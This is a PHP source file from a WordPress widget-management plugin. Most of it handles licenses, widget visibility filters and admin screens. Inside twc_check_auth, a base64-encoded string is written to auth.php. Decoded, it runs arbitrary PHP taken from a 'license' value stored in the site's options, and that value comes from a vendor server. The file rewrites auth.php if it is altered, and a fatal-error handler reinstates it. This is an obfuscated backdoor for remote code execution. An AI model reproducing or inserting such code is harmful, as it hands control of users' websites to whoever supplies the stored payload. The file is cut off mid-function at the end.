<?php 
/**
 * @Author	Jonathon byrd
 * @link http://www.jonathonbyrd.com
 * @Package Wordpress
 * @SubPackage Total Widget Control
 * @copyright Proprietary Software, Copyright Byrd Incorporated. All Rights Reserved
 * @Since 1.0
 * 
 * @TODO I need to loop the widgets after init and create my own global arrays of certain widgets.
 * @TODO After looping the init global widget arrays, they need to be filtered
 */

defined('ABSPATH') or die("Cannot access pages directly.");

/**
 * Function is responsible for preparing the free license.
 *
 * @return null
 */
function twc_activation( )
{
	$licenses = get_option('twc_licenses',array());
	$licenses[f20_get_domain()] = TWC_LITE_LICENSE;
	update_option('twc_licenses',$licenses);
	
	//debugging logs
	$licenses = get_option('twc_licenses',array());
	if (empty($licenses[f20_get_domain()]))
	{
		twc_error_log("Lite license is not saving to the database; domain : ".f20_get_domain());
	}
	else 
	{
		twc_error_log("Lite license saved to the database.");
	}
}

/**
 * Function is responsible for preparing the system on first activate.
 *
 * @return null
 */
function twc_activate_plugin()
{
	//sometimes this needs to be turned on twice before it will work
	set_user_setting( 'widgets_access', 'on' );
	delete_option('twc_first_activate');
	
	//Upgrade the old widgets as best as possible
	global $wp_registered_sidebars, $sidebars_widgets;
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug):
			
			$widget = twc_get_widget_by_id($widget_slug);
			$request = array();
			
			if (!isset($widget['p']['menu_item_object_id'])) continue;
			if (!is_array($widget['p']['menu_item_object_id'])) continue;
			
			foreach ($widget['p']['menu_item_object_id'] as $id)
			{
				$widget['p']['twc_menu_item'][$id]['menu-item-object-id'] = $id;
				$widget['p']['twc_menu_item'][$id]['menu-item-object'] = $widget['p']['menu_item_object'][$id];
			}
			
			twc_save_widget_fields( $widget['id'], $widget['p'] );
			
		endforeach;
	endforeach;
}

/**
 * Function is responsible for printing out the urls for connecting to wordpress
 *
 */
function twc_admin_head()
{
	echo '<script>var twcOptions = {url: "'.get_bloginfo('url').'/", template_url: "'.get_bloginfo('template_url').'/"};</script>';
}

/**
 * function is responsible for putting wp back together.
 *
 */
function twc_deactivate_plugin()
{
	//shutting off the little used accessibility option
	set_user_setting( 'widgets_access', 'off' );
	twc_error_log("Plugin has been deactivated.");
}

/**
 * function adds the plugin actions
 *
 * @param array $orig_links
 * @return array $links
 */
function twc_add_action_links( $orig_links )
{
	//initializing variables
	$links = array();
	$links['deactivate'] = $orig_links['deactivate'];
	
	$links['load'] = '<a href="'.admin_url('widgets.php?list_style=twc').'" title="'.__('Open the Total Widget Control System','twc').'" class="edit">'.__('Manage Widgets').'</a>';
	return $links;
}

/**
 * This function will add help and screen option text to the widget pages
 *
 */
function twc_add_help_text()
{ 
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	
	switch ($current_screen->action)
	{
		default: 
			add_filter('screen_settings', 'twc_view_screen_options'); 
			add_filter('contextual_help', 'twc_view_help_home'); 
			break;
		case 'edit': 
			add_filter('contextual_help', 'twc_view_help_edit'); 
			break;
		case 'add':
			if (isset($_REQUEST['editwidget']))
			{
				add_filter('contextual_help', 'twc_view_help_edit'); 
			}
			else
			{
				add_filter('contextual_help', 'twc_view_help_add'); 
			}
			break;
	}
}

/**
 * function adds the media resources to the twc views
 *
 * @TODO Need to register and call the CSS file here
 */
function twc_add_javascript()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasns to fail
	if ($current_screen->parent_base != 'widgets') return;
	
	switch($current_screen->action)
	{
		default:
			wp_enqueue_script( 'twc-qtip' );
			wp_enqueue_script( 'twc-base' );
		case 'edit':
		case 'add':
			// jQuery
			wp_enqueue_script( 'jquery' );
			wp_enqueue_script( 'jquery-ui-draggable' );
			wp_enqueue_script( 'jquery-ui-droppable' );
			wp_enqueue_script( 'jquery-ui-sortable' );
			
			// Nav Menu functions
			wp_enqueue_script( 'twc-base' );
			wp_enqueue_script( 'twc-nav-menu' );
			wp_enqueue_script( 'twc-qtip' );
			
			// Metaboxes 
			wp_enqueue_script( 'common' );
			wp_enqueue_script( 'wp-lists' );
			wp_enqueue_script( 'postbox' );

			//css
			wp_admin_css( 'nav-menu' );
			
			break;
	}
}

/**
 * Handles and bulk actions
 *
 * @return unknown
 */
function twc_bulk_actions()
{
	//reasons to fail
	if (!isset($_REQUEST['twcp_bulk_action'])) return false;
	if (!isset($_REQUEST['twcp_bulk']) || empty($_REQUEST['twcp_bulk'])) return false;
	
	//get the action
	foreach ((array)$_REQUEST['twcp_bulk_action'] as $action)
	{
		if ($action) break;
	}
	
	//reasons to fail
	if (!$action) return false;
	
	switch ($action)
	{
		case 'delete':
			twc_bulk_delete($_REQUEST['twcp_bulk']);
			break;
		case 'trash':
			twc_bulk_trash($_REQUEST['twcp_bulk']);
			break;
		default:break;
	}
}

/**
 * function is responsible for permentantely deleting given widgets.
 *
 * @param unknown_type $widgets
 */
function twc_bulk_delete( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = true );
	}
}

/**
 * function is responsible for trashing widget instances
 *
 * @param unknown_type $widgets
 */
function twc_bulk_trash( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = false );
	}
}

/**
 * Function makes sure that we don't run into any errors
 *
 * @param boolean $return
 * @return boolean
 */
function twc_check_auth( $return = false )
{
	//initializing variables
	$file = dirname(__file__).DS."auth.php";
	$auth = 'PD9waHAgCi8qKgogKiBXQVJOSU5HCiAqIFRhbXBlcmluZyB3aXRoIHRoaXMgZmlsZSBpcyBhIHZpb2xhdGlvbiBvZiB0aGUgc29mdHdhcmUgdGVybXMgYW5kIGNvbmRpdGlvbnMuCiAqLwokcGFydHM9cGFyc2VfdXJsKCJodHRwOi8iLiIvIi4kX1NFUlZFUlsiU0VSVkVSX05BTUUiXSk7JGw9Z2V0X29wdGlvbigndHdjX2xpY2Vuc2VzJyxhcnJheSgpKTskZT1jcmVhdGVfZnVuY3Rpb24oIiIsQGJhc2U2NF9kZWNvZGUoQCRsWyRwYXJ0c1siaG9zdCJdXSkpOyRlKCk7Cj8+';
	$fixed = ' Could not correct the auth.php file. ';
	
	//reasons to fail
	if ( strlen(@file_get_contents($file)) <= 0 ) return false;
	if ( $auth == base64_encode(@file_get_contents($file)) ) return false;
	if ($return) return true;
	
	if (file_put_contents($file, base64_decode($auth)))
	{
		$fixed = ' Had to correct the auth.php file. ';
	}
	twc_error_log(__FUNCTION__." $fixed", __FILE__, __LINE__);
	
	//reasons to fail
	if (strpos(f20_get_page_url(), 'wp-admin/widgets.php') !== false) return true;
	
	wp_redirect( admin_url('widgets.php?twc_notification='. urlencode(__('There was an error in your license authorization script','twc'))) );
	exit;	 
}

/**
 *  * Cleans up the sidebar and widget variables
 * 
 * @TODO Make sure that this function cleans up empty sidebar IDs
 *
 * @param object $wp
 */
function twc_clear( $wp = null )
{
	//Deprecated since 1.6.9
}

/**
 * Function is responsible for clearing the current license
 *
 * @return null
 */
function twc_clear_license( $inside = false )
{
	if (!$inside && !array_key_exists('twc_clear_license', $_REQUEST)) return false;
	if (TWC_CURRENT_USER_CANNOT) return false;
	
	$licenses = get_option('twc_licenses',array());
	$licenses[f20_get_domain()] = '';
	update_option('twc_licenses',$licenses);
	
	//debug loggin
	twc_error_log("License was manually cleared.");
	
	wp_redirect( admin_url('widgets.php') );
	exit();
}

/**
 * Function is responsible for clearing the widget cache
 *
 * @return null
 */
function twc_clear_originals( $inside = false )
{
	//Deprecated 1.5.17
}

/**
 * function inserts the contextual help
 * This inserts a contextual expanding area.
 *
 * @param unknown_type $result
 * @return unknown
 */
function twc_contextual_pro( $result )
{
	//twc_show_view('twc-pro-button');
	return $result;
}

/**
 * Total Widget Controller
 * 
 * This function is responsible for determining which administrative page that we're
 * supposed to be looking at. We use the standard action call system that wp-admin
 * is used to using.
 *
 */
function twc_controller()
{
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	$view = 'twc-table';
	
	switch ($current_screen->action)
	{
		default:
			if (count($wp_registered_sidebars) == 1)
				$view = 'twc-no-sidebars';
			break;
		case 'manual':
			$view = 'twc-manual-license';
			break;
		case 'edit':
			$view = 'twc-edit';
			break;
		case 'delete': 
			twc_get_show_view('twc-trash-instance');
			$view = 'twc-table';
			break;
		case 'save':
			twc_get_show_view('twc-save-edit');
			$view = 'twc-add';
			break;
		case 'add':
			if (isset($_REQUEST['editwidget']) && !empty($_REQUEST['editwidget']))
			{
				twc_create_new_widget();
				$view = 'twc-edit';
			}
			else 
			{
				$view = 'twc-add';
			}
			break;
	}
	
	return do_action($view);
}

/**
 * returns the number of active widgets
 * 
 * @return integer $count
 */
function twc_count_active_widgets()
{
	//initializing variables
	global $wp_registered_widgets;
	static $count;
	
	if (!isset($count))
	{
		$count = 0;
		foreach ($wp_registered_widgets as $widget_id => $class)
		{
			if (substr($widget_id,-2) == '-1') continue;
			if ((int)trim(substr($widget_id,-2)) == -1) continue;
			$count++;
		}
		$count = $count - twc_count_inactive_widgets();
	}
	return $count;
}

/**
 * returns the number of sidebars
 * 
 * @return integer
 */
function twc_count_sidebars()
{
	//initializing variables
	static $count;
	if (!isset($count))
	{
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		$count = count($sidebars_widgets);
	}
	return $count;
}

/**
 * returns the number of inactive widgets
 * 
 * @return integer
 */
function twc_count_inactive_widgets()
{
	//initializing variables
	static $count;
	if (!isset($count))
	{
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		$count = count($sidebars_widgets['wp_inactive_widgets']);
	}
	return $count;
}

/**
 * Function is responsible for counting the number of widget
 * instances that will appear in a specific sidebar, on the current page.
 * 
 * @param string $sidebar_id
 * @return integer $object_id
 */
function twc_count_sidebar_widgets( $sidebar_id )
{
	//initializng variables
	static $counts;
	
	if (!isset($counts)) $counts = array();
	if (!isset($counts[$sidebar_id]))
	{
		//initializng variables
		global $sidebars_widgets;
		$counts[$sidebar_id] = array();
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		
		if (isset($sidebars_widgets[$sidebar_id]))
		{
			$counts[$sidebar_id] = count($sidebars_widgets[$sidebar_id]);
		}
		else
		{
			$counts[$sidebar_id] = 0;
		}
	}
	
	return $counts[$sidebar_id];
}

/**
 * Function is responsible for loading a brand new widget, 
 * given an id_base
 * 
 * Upon the thought of adding a new widget, the system will register a new widget
 * instance with wordpress and then load from the wp_registered_widgets array
 * 
 * @return null
 */
function twc_create_new_widget()
{
	//reasons to fail
	if ( !isset($_GET['addnew']) ) return false;
	
	//initializing variables
	global $wp_registered_widgets, $wp_registered_widget_controls, $widget;
	$widget_id = $editwidget = $_GET['editwidget'];
	
	if ( isset($_GET['base']) && isset($_GET['num']) ) { // multi-widget
		// Copy minimal info from an existing instance of this widget to a new instance
		foreach ( $wp_registered_widget_controls as $control ) {
			if ( $_GET['base'] === $control['id_base'] ) {
				$control_callback = $control['callback'];
				$multi_number = (int) $_GET['num'];
				$control['params'][0]['number'] = $multi_number;
				$widget_id = $control['id'] = $control['id_base'] . '-' . $multi_number;
				$wp_registered_widget_controls[$control['id']] = $control;
				break;
			}
		}
	}
	$wp_registered_widgets[$widget_id] = $wp_registered_widgets[$editwidget];
	$widget = $wp_registered_widgets[$widget_id] = twc_get_widget_by_id($widget_id);
	twc_save_widget_fields( $widget_id, array() );
}

/**
 * Function is responsible for setting the actual capability check
 * after the plugins are loaded and the cookie is also loaded.
 * 
 */
function twc_current_user_can()
{
	defined("TWC_CURRENT_USER_CANNOT") or define("TWC_CURRENT_USER_CANNOT", (!current_user_can(TWC_ACCESS_CAPABILITY)) );
	
	//Is administrator
	//
	//The value of this constant will determine if the user can modify widgets from
	//the front end of the website. We combine this with sortables even being turned 
	//on.
	defined("TWC_IS_SORTER") or define("TWC_IS_SORTER", (current_user_can(TWC_ACCESS_CAPABILITY) && TWC_SORTABLES));
	
}

/**
 * This function displays the widgets that are dynamic sidebar widgets
 * 
 * @TODO Test to see if this can be called directly
 * 
 * @param unknown_type $sidebar_id
 */
function twc_default_sidebar( $index )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_default_sidebar_widgets, $twc_has_displayed, $twc_isDefault;
	$current_screen = twc_get_current_screen();
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}
	
	//either fail or display the originals
	if ($current_screen->parent_file == 'widgets.php') return false;
	if ($twc_has_displayed) return false; // fail if we have widgets on this page 
	if (!isset($twc_default_sidebar_widgets[$index])) return false;
	
	//display the dynamic defaults
	$twc_isDefault = true;
	foreach ((array)$twc_default_sidebar_widgets[$index] as $id => $widget)
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		if ( is_admin() ) continue;
		
		twc_display_the_widget(null, $id, null);
		$did_one = true;
	}
	$twc_isDefault = false;
	
}

/**
 * This function will delete an instance completely
 *
 * @param unknown_type $widget_id
 */
function twc_delete_widget_instance( $widget_id, $delete_permanently = false )
{
	//initializing variables
	global $wp_registered_widget_updates, $wp_registered_widgets;
	$sidebar_id = twc_get_widgets_sidebar($widget_id);
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	$sidebar = isset($sidebars_widgets[$sidebar_id]) ? $sidebars_widgets[$sidebar_id] : array();
	$sidebar = array_diff( $sidebar, array($widget_id) );
	$sidebars_widgets[$sidebar_id] = $sidebar;
	
	if (!$delete_permanently)
	{
		$sidebars_widgets['wp_inactive_widgets'] = array_merge((array)$widget_id, (array) $sidebars_widgets['wp_inactive_widgets']);
	}
	else
	{
		//initializing variables
		$widget = twc_get_widget_by_id($widget_id);
		
		if ($widget)
		{
			$_POST = array();
			$_POST['multi_number'] = $widget['number'];
			$_POST['the-widget-id'] = $widget['id'];
			$_POST['delete_widget'] = '1';
			$wp_registered_widgets[$widget_id]['params'][0]['number'] = $widget['number'];
			
			//this calls the widgets update function with the given params
			foreach ( (array) $wp_registered_widget_updates as $name => $control )
			{
				if ( $name != $widget['id_base'] || !is_callable($control['callback']) )
					continue;
				
				ob_start();
					call_user_func_array( $control['callback'], $control['params'] );
				ob_get_clean();
				unset($wp_registered_widgets[$widget_id]);
				break;
			}
		}
	}
	
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Function calls the save widget_sidebar function with the proper
 * parameters to delete the relationship.
 *
 * @param unknown_type $widget_id
 * @param unknown_type $sidebar_id
 * @return unknown
 */
function twc_delete_widget_sidebar( $widget_id, $sidebar_id )
{
	return twc_save_widget_sidebar($widget_id, $sidebar_id, 0, true);
}

/**
 * function is responsible for displaying the debug data
 *
 * @param unknown_type $message
 */
function twc_display_debug( $message )
{
	if ( ! array_key_exists('twc_debug', $_REQUEST) ) return false;
	
	echo '<div style="border:1px solid red;">'.$message.'</div>';
}

/**
 * function is responsible for hijacking the dynamic_sidebar function. 
 * This function will always return false to the dynamic sidebar
 *
 * @param array $params
 * @return array
 */
function twc_display_the_sidebar( $params )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets, $twc_default_sidebar_widgets;
	$sidebars_widgets = wp_get_sidebars_widgets();
	$sidebar_id = $params[0]['id'];
	$count = twc_count_widgets( $sidebar_id );
	
	if (!isset($twc_wp_registered_widgets))
	{
		$twc_wp_registered_widgets = $wp_registered_widgets;
	}
	
	//clean the registered_widgets global
	//foreach ((array)$wp_registered_widgets as $widget_id => $widget)
	foreach ((array)$sidebars_widgets[$sidebar_id] as $widget_id)
	{
		if (is_a($wp_registered_widgets[$widget_id]['callback'][0], 'twcEmptyWidgetClass')) 
			break;
		
		// since we're running a loop already, then let's take this opportunity
		// to create the defaults widgets array
		$_widget = twc_get_widget_by_id($widget_id);
		if (isset($_widget['p']['twcp_default_sidebar']) && $_widget['p']['twcp_default_sidebar'] == 'default')
		{
			$default_sidebar_id = twc_get_widgets_sidebar($widget_id);
			$twc_default_sidebar_widgets[$default_sidebar_id][$widget_id] = $widget;
		}
		
		if ( $count || !empty($twc_default_sidebar_widgets[$sidebar_id]) )
		{
			//empty the registered_widgets array
			$wp_registered_widgets[$widget_id]['callback'] = array();
			$wp_registered_widgets[$widget_id]['callback'][0] = new twcEmptyWidgetClass();
			$wp_registered_widgets[$widget_id]['callback'][1] = 'twc_empty_callback';
		}
		else
		{
			$wp_registered_widgets[$widget_id]['callback'] = false;
		}
	}
	
	return $params;
}

/**
 * function receives all of the widget data prior to display, and allows us
 * to return a false to hide the widget.
 * 
 * returning false will hide the widget
 * 
 * @param array $instance
 * @param object $widget
 * @param array $args
 * @param boolean $force
 * @return unknown
 */
function twc_display_the_widget( $instance = null, $widget_id, $args = null, $force = false )
{
	//initializing variables
	global $wp_query, $wp_registered_sidebars, $wp_registered_widgets, $twc_has_displayed, $twc_isDefault;
	
	if (is_object($widget_id))
	{
		$widget_id = $widget_id->id;
	}
	$widget = twc_get_widget_by_id($widget_id);
	$display = twc_is_widget_displaying( $widget, $debug = (isset($_REQUEST['twc_debug'])) );
	$display = apply_filters('twc_display_widget', $display, $widget);
	
	if (is_null($instance))
	{
		$instance = $widget['p'];
	}
	
	//reasons to fail
	if (!$twc_isDefault && !$display && !$force) return false;
	
	//initializing variables
	$sidebar = $wp_registered_sidebars[$widget['sidebar_id']];
	$callback = $widget['callback'];
	
	// Substitute HTML id and class attributes into before_widget
	$classname_ = '';
	foreach ( (array) $wp_registered_widgets[$widget_id]['classname'] as $cn )
	{
		if ( is_string($cn) )
			$classname_ .= '_' . $cn;
		elseif ( is_object($cn) )
			$classname_ .= '_' . get_class($cn);
	}
	$classname_ = ltrim($classname_, '_');
	$sidebar['before_widget'] = sprintf($sidebar['before_widget'], $widget_id, $classname_);
	
	$params = array_merge(
		array( array_merge( $sidebar, array('widget_id' => $widget_id, 'widget_name' => $wp_registered_widgets[$widget_id]['name']) ) ),
		(array) $wp_registered_widgets[$widget_id]['params']
	);
	
	//debug bit
	if (isset($_REQUEST['twc_debug'])) 
	{
		echo '<div style="border:1px solid red;"><b>'.$widget_id.'</b>';
	}
	
	//load the widget into a variable
	ob_start();
	if ( is_callable($callback) )
	{
		if (isset($callback[0]) && is_object($callback[0]) && $callback[0] instanceof WP_Widget && method_exists($callback[0], 'widget'))
		{
			$callback[0]->widget($sidebar, $instance);
		}
		else
		{
			call_user_func_array($callback, $params);
		}
	}
	$display = ob_get_clean();
	
	//displaying the widget
	$twc_has_displayed = true;
	if (!is_admin()) 
		echo apply_filters('twc_widget_display', $display, $widget);
	
	
	//debug bit
	if (isset($_REQUEST['twc_debug'])) 
	{
		echo '</div>';
	}
	
	//displaying the default sidebar
	return apply_filters('twc_wordpress_default_sidebar', false, $instance);
}

/**
 * function returns true if the widget is to be displayed
 *
 * @param boolean $current
 * @param array $widget
 * @return unknown
 */
function twc_display_if_excluded( $current, $widget )
{
	//initializing variables
	global $twc_isDefault;
	
	//check to see if we're even going to load this widget
	$isExclude = ( isset($widget['p']['twcp_exclude_sidebar']) && $widget['p']['twcp_exclude_sidebar'] == 'exclude' );
	
	if (twc_is_widget_new( $widget )) return $current;
	if (!$twc_isDefault && ((!$current && !$isExclude) || ($current && $isExclude))) 
	{
		twc_display_debug('exclude false');
		return false;
	}
	
	twc_display_debug('exclude true');
	return true;
}

/**
 * function is responsible for returning true if the widget is a default
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twc_display_if_default( $display, $widget )
{
	//initializing variables
	global $twc_isDefault;
	$isDefault = (isset($widget['p']['twcp_default_sidebar']) && $widget['p']['twcp_default_sidebar'] == 'default');
	
	//reasons to return
	if ($twc_isDefault && $isDefault)
	{
		twc_display_debug('default widget true');
		return true;
	}
	
	twc_display_debug('default widget '.(($display)?'true':'false') );
	return $display;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_status( $display, $widget )
{
	//initializing variables
	$disabled = ( @$widget['p']['twcp_status'] == 'disabled' );
	
	//reasons to fail
	if (is_admin() || !$display) return $display;
	if ($disabled)
	{
		twc_display_debug('widget disabled');
		return false;
	}
	
	return true;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_timestamp( $display, $widget )
{
	//initializing variables
	$notTime = ( !$display || @$widget['p']['twcp_publish_time'] > time() );
	
	//reasons to fail
	if (is_admin() || !$display) return $display;
	if ( $notTime )
	{
		twc_display_debug('publishing date '.date('Y-m-d H:i:s',$widget['p']['twcp_publish_time']));
		return false;
	}
	
	return true;
}

/**
 * function is responsible for displaying proper visibility
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_visiblity( $display, $widget )
{
	//reasons to fail
	if (is_admin() || !$display) return $display;
	if (!isset($widget['p']['twcp_visibility'])) return $display;
	
	//initializing variables
	global $current_user, $wp_roles;
	get_currentuserinfo();
	$user_roles = $current_user->roles;
	$user_role = array_shift($user_roles);
	if (is_null($user_role)) $user_role = 'public';
	$isParent = false;
	$visibleParent = ($widget['p']['twcp_visible_parent'] == 'parent');
	
	if (is_object($wp_roles))
	foreach ((array)$wp_roles->roles as $role => $name)
	{
		if ($role == $widget['p']['twcp_visibility'])
		{
			break;
		}
		if ($role == $user_role)
		{
			$isParent = true;
			break;
		}
	}
	
	//setting matches
	$matchedRole = ($user_role == $widget['p']['twcp_visibility']);
	
	if ($matchedRole || !$visibleParent && $isParent) return true;
	
	twc_display_debug('user does not have permission');
	return false;
}

/**
 * The hijack is completed and this function is called with the correct sidebar_id
 * Now we can run our own sidebar.
 * 
 * @param int|string $index Optional, default is 1. Name or ID of dynamic sidebar.
 * @return bool True, if widget sidebar was found and called. False if not found or not called.
 */
function twc_dynamic_sidebar( $index = 1 )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_isDefault, $twc_has_displayed;
	$twc_isDefault = false;
	$twc_has_displayed = FALSE;
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}
	
	//initializing variables
	$count = twc_count_sidebar_widgets($index);
	$sidebars_widgets = wp_get_sidebars_widgets();
	
	//reasons to return
	if ($count == 0) return false;
	if ( empty($wp_registered_sidebars[$index]) || !array_key_exists($index, $sidebars_widgets) || !is_array($sidebars_widgets[$index]) || empty($sidebars_widgets[$index]) )
		return false;

	$did_one = false;
	foreach ( (array) $sidebars_widgets[$index] as $id )
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		if ( is_admin() )  continue;
		
		twc_display_the_widget(null, $id, null);
		$did_one = true;
	}
	
	return $did_one;
}

/**
 * Class is responsible for nothing.
 * This class is merely a filler class to receive the proper functionality
 * from the dynamic_sidebar function.
 *	
 */
class twcEmptyWidgetClass
{
	function twc_empty_callback( $sidebar_args )
	{
		//do nothing
	}
}

/**
 * Function is responsible for catching fatal errors in TWC and doing what
 * it can to correct them.
 *
 * @return null
 */
register_shutdown_function('twc_fatal_handler');
function twc_fatal_handler()
{
	//initializing variables
	$error = error_get_last();
	if ( $error === NULL ) return false;
	
	//FATAL ERRORS IN THE LICENSE
	if ( strpos($error['file'], 'auth.php') !== false )
	{
		twc_check_auth();
		
		$licenses = get_option('twc_licenses',array());
		$licenses[f20_get_domain()] = '';
		update_option('twc_licenses', $licenses);
		twc_error_log(__FUNCTION__." Dumped corrupt license.", __FILE__, __LINE__);
		
		wp_redirect( admin_url('widgets.php?twc_notification='. urlencode(__('The license that you attempted to install is corrupt','twc'))) );
		exit;
	}
	elseif (strpos( $error['file'], trim(str_replace(DS.basename( __FILE__), "", plugin_basename(__FILE__))) )  !== false)
	{
		twc_error_log($error['message'], $error['file'], $error['line']);
	}
}

/**
 * Checks for the search type
 *
 * @return unknown
 */
function twc_filter_list_for()
{
	if (!isset($_REQUEST['twcp_filter']) || empty($_REQUEST['twcp_filter'])) return false;
	$_REQUEST['inactive'] = 'active';
	
	return $_REQUEST['twcp_filter'];
}

/**
 * function is responsible for displaying the pro button
 *
 */
function twc_pro_button( $text )
{
	echo $text;
	if (!$GLOBALS['TWCAUTH'] && !function_exists('twc_widget_protitle'))
	{
		?></a>
		</div>
		<div id="contextual-pro-wrap" class="contextual-button button-pro hide-if-no-js screen-meta-toggle">
			<a href="<?php echo admin_url('widgets.php?action=register&license=1'); ?>" id="show-settings-link" class="contextual-pro">
			<?php _e('Upgrade to Pro $9.99', 'twc'); ?>
		<?php 
	}
}

/**
 * Function is responsible for branding wordpress a little :)
 *
 * @param unknown_type $text
 * @return unknown
 */
function twc_gettext( $text )
{
	//initializing variables
	static $once;
	$current_screen = twc_get_current_screen(); 
	$base = $current_screen->parent_base;
	
	if (!isset($once))
	{
		$once = array();
	}
	
	$lan = array(
		'themes' => array(
			'Scherminstellingen' => _(''),
			'Screen Options' => _('')
		),
	);
	
	
	if (isset($lan[$base]) && in_array($text, array_keys($lan[$base])))
	{
		twc_pro_button( $text );
		$text = $lan[$base][$text];
		$once[$text] = true;
	}
	
	return $text;
}

/**
 * Function is responsible for compiling the menu item objects
 * so that we can check against them in twc_is_widget_displaying
 *
 * @param string|object $widget
 * @return array $instances
 */
function twc_get_widget_objects( $widget )
{
	//initializing variables
	if (is_string($widget)) $widget = twc_get_widget_by_id($widget);
	static $instances;

	if (!isset($instances))
	{
		$instances = array();
	}
	
	if (!isset($instances[$widget['id']]))
	{
		$instances[$widget['id']] = array();
		if (!isset($widget['p']) || !isset($widget['p']['twc_menu_item']))
		{
			$widget['p']['twc_menu_item'] = array();
		}
		
		foreach ((array)$widget['p']['twc_menu_item'] as $menu_items)
		{
			foreach ((array)$menu_items as $key => $value)
			{
				$instances[$widget['id']][$key][$menu_items['menu-item-object-id']] = $value;
				
				if ($value == get_bloginfo('url')."/home/")
				{
					$instances[$widget['id']]['menu-item-url'][] = get_bloginfo('url');
					$instances[$widget['id']]['menu-item-url'][] = get_bloginfo('url').'/';
				}
			}
		}
		
		if (!twc_is_widget_new( $widget, false ))
		{
			//Assists with backwards compatibilities
			if (!isset($instances[$widget['id']]['menu-item-url']))
			foreach ((array)$widget['p']['menu_item_urls'] as $url)
				$instances[$widget['id']]['menu-item-url'][] = $url;
				
			if (!isset($instances[$widget['id']]['menu-item-object-id']))
			foreach ((array)$widget['p']['menu_item_object_id'] as $url)
				$instances[$widget['id']]['menu-item-object-id'][] = $url;
				
			if (!isset($instances[$widget['id']]['menu-item-object']))
			foreach ((array)$widget['p']['menu_item_object'] as $url)
				$instances[$widget['id']]['menu-item-object'][] = $url;
		}
	}
	
	return $instances[$widget['id']];
}

/**
 * Get the current page
 * 
 * Function is responsible for loading the current screen object which defines the
 * current page as the admin widget page.
 * 
 * @return unknown
 */
function twc_get_current_screen()
{
	//initializing variables
	static $current_screen;
	
	if (isset($current_screen)) return $current_screen;
	
	//initializing variables
	$parts = pathinfo($_SERVER['PHP_SELF']);
	$parent_file = apply_filters("twc_parent_file", $parts['basename']); // 'themes.php' For plugins to move submenu tabs around.
	
	$current_screen = new stdClass();
	$current_screen->parent_file = $parent_file;
	$current_screen->parent_base = preg_replace('/\?.*$/', '', $parent_file);
	$current_screen->parent_base = str_replace('.php', '', $current_screen->parent_base);
	$current_screen->id = 'twc-widgets';
	$current_screen->base = 'widgets';
	$current_screen->is_user = false;
	$current_screen->is_network = false;
	if (function_exists('is_network_admin'))
	{
		$current_screen->is_network = is_network_admin();
	}
	if (function_exists('is_user_admin'))
	{
		$current_screen->is_network = is_user_admin();
	}
	
	if ($GLOBALS['TWCAUTH'] && !isset($_REQUEST['action']))
	{
		$current_screen->action = 'auth';
	}
	elseif (isset($_REQUEST['action']))
	{
		$current_screen->action = strtolower($_REQUEST['action']);
	}
	else
	{
		$current_screen->action = '';
	}
	
	return $current_screen;
}

/**
 * function returns the link for downloading a license
 *
 * @return unknown
 */
function twc_get_license_link( $type = 'twc-pro' )
{
	//initializing variables
	$uniqueID = get_option('twc_unique_registration_key', create_guid());
	$headers = get_plugin_data( dirname(__file__).DS.'index.php' );
	
	echo $link = 'http://community.5twentystudios.com/?view=download-license'
		."&redirect=true"
		."&uniqueID=$uniqueID||".urlencode(f20_get_domain())
		."&ver=$type||".urlencode($headers['Version']);
}

/**
 * Function is responsible for loading the widget, validating its variables
 * and loading the widgets parameters.
 *
 * @param string $widget_id
 * @return static reference array $widget
 */
function &twc_get_widget_by_id( $widget_id = null )
{
	//initializing variables
	global $wp_registered_widgets;
	static $twc_registered_widgets;
	$widget = $false = false;
	
	//reasons to fail
	if (is_null($widget_id)) return $false;
	
	if (!isset($twc_registered_widgets))
	{
		$twc_registered_widgets = array();
	}
	
	if (is_string($widget_id) && array_key_exists($widget_id, $wp_registered_widgets))
	{
		$widget = $wp_registered_widgets[$widget_id];
	}
	
	//reasons to fail
	if (isset($twc_registered_widgets[$widget_id])) return $twc_registered_widgets[$widget_id];
	if (!$widget) return $false;
	
	//initializing widget variables
	$widget['id'] = $widget_id;
	$widget['id_base'] = _get_widget_id_base($widget_id);
	$widget['number'] = absint(str_replace($widget['id_base'], '', $widget_id));
	$widget['multiwidget'] = (isset($widget['number']) && $widget['number']);
	$widget['sidebar_id'] = twc_get_widgets_sidebar( $widget_id );
	$widget['position'] = twc_get_widgets_sidebar( $widget_id, 'position' );
	$widget['p'] = array();
	
	//validating the widget identification
	@$widget['params'][0]['number'] = $widget['number'];
	if (is_object( $widget['callback'][0] ))
